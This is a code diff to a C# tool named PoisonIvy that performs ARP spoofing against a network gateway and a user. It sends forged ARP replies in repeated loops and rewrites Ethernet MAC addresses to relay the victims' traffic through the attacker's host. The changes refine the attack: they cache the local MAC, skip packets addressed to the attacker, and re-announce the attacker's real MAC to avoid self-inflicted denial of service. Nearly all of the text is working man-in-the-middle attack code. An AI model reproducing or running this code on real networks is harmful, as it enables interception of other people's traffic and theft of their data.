@@ -25,6 +25,8 @@ namespace PoisonIvy
         {
             this.from = f;
             this.to = t;
+            this.local = GetLocalIP();
+            this.local_mac = adapter.InterfaceInformation.GetPhysicalAddress();
             isWaitingFROM = true;
             isWaitingTO = true;
             
@@ -43,14 +45,14 @@ namespace PoisonIvy
             System.Diagnostics.Debug.WriteLine("Poisoning gateway at " + to.ToString());
             for (int i = 0; i < 10; ++i)
             {
-                adapter.SendPacket(generateARP(from, to, adapter.InterfaceInformation.GetPhysicalAddress(), to_mac));
+                adapter.SendPacket(generateARP(from, to, local_mac, to_mac));
                 System.Threading.Thread.Sleep(500);
             }
 
             System.Diagnostics.Debug.WriteLine("Poisoning user at " + from.ToString());
             for (int i = 0; i < 10; ++i)
             {
-                adapter.SendPacket(generateARP(to, from, adapter.InterfaceInformation.GetPhysicalAddress(), from_mac));
+                adapter.SendPacket(generateARP(to, from, local_mac, from_mac));
                 System.Threading.Thread.Sleep(500);
             }
 
@@ -69,9 +71,13 @@ namespace PoisonIvy
             System.Diagnostics.Debug.WriteLine("Entering poison loop.");
             while (isPoisoning)
             {
-                adapter.SendPacket(generateARP(from, to, adapter.InterfaceInformation.GetPhysicalAddress(), to_mac));
-                adapter.SendPacket(generateARP(to, from, adapter.InterfaceInformation.GetPhysicalAddress(), from_mac));
-                System.Threading.Thread.Sleep(1000);
+                // respoof gateway and user
+                adapter.SendPacket(generateARP(from, to, local_mac, to_mac));
+                adapter.SendPacket(generateARP(to, from, local_mac, from_mac));
+                // also tell them our IPs REAL MAC so we don't DOS ourselves
+                adapter.SendPacket(generateARP(local, to, local_mac, to_mac));
+                adapter.SendPacket(generateARP(local, from, local_mac, from_mac));
+                System.Threading.Thread.Sleep(2000);
             }
         }
 
@@ -130,13 +136,22 @@ namespace PoisonIvy
             {
                 if (in_packet.ContainsLayer(Protocol.Ethernet) && !(in_packet.Outbound))
                 {
+                    EthPacket packet = (EthPacket)in_packet;
+                    if (in_packet.ContainsLayer(Protocol.IP))
+                    {
+                        IPPacket ip = (IPPacket)in_packet;
+                        if ( ip.DestIP.Equals(GetLocalIP()))
+                        {
+                            return null;
+                        }
+                    }
+
                     // check if the packet is from our USER; if it is, rewrite the destination MAC to the
                     // router MAC address
-                    EthPacket packet = (EthPacket)in_packet;
                     if (new PhysicalAddress(packet.FromMac).ToString().Equals(from_mac.ToString()))
                     {
                         packet.ToMac = to_mac.GetAddressBytes();
-                        packet.FromMac = adapter.InterfaceInformation.GetPhysicalAddress().GetAddressBytes();
+                        packet.FromMac = local_mac.GetAddressBytes();
                         packet.Outbound = true;
 
                         // send the packet and drop the pmr so the packet isn't processed any further
@@ -152,7 +167,7 @@ namespace PoisonIvy
                     {
                         // swap out the MAC and forward it
                         packet.ToMac = from_mac.GetAddressBytes();
-                        packet.FromMac = adapter.InterfaceInformation.GetPhysicalAddress().GetAddressBytes();
+                        packet.FromMac = local_mac.GetAddressBytes();
                         packet.Outbound = true;
 
                         // send the packet and drop the pmr so the packet isn't processed any further
@@ -178,7 +193,7 @@ namespace PoisonIvy
                             for ( int i = 0; i < 10; ++i )
                             {
                                 adapter.SendPacket(generateARP(to, request.ASenderIP, 
-                                                              adapter.InterfaceInformation.GetPhysicalAddress(), 
+                                                              local_mac, 
                                                               new PhysicalAddress(request.ASenderMac)));
                                 System.Threading.Thread.Sleep(500);
                             }
@@ -193,7 +208,7 @@ namespace PoisonIvy
                             System.Diagnostics.Debug.WriteLine("repoisoning GATEWAY ip " + request.ASenderIP.ToString());
                             for (int i = 0; i < 10; ++i)
                             {
-                                adapter.SendPacket(generateARP(from, to, adapter.InterfaceInformation.GetPhysicalAddress(),
+                                adapter.SendPacket(generateARP(from, to, local_mac,
                                                                          to_mac));
                                 System.Threading.Thread.Sleep(500);
                             }
@@ -230,6 +245,19 @@ namespace PoisonIvy
                         System.Diagnostics.Debug.WriteLine("Caught TO MAC at: " + to_mac.ToString());
                         isWaitingTO = false;
                     }
+                }
+            }
+            return null;
+        }
+        // return local IPv4 addr
+        public IPAddress GetLocalIP()
+        {
+            IPHostEntry he = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (IPAddress addr in he.AddressList)
+            {
+                if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                {
+                    return addr;
                 }
             }
             return null;
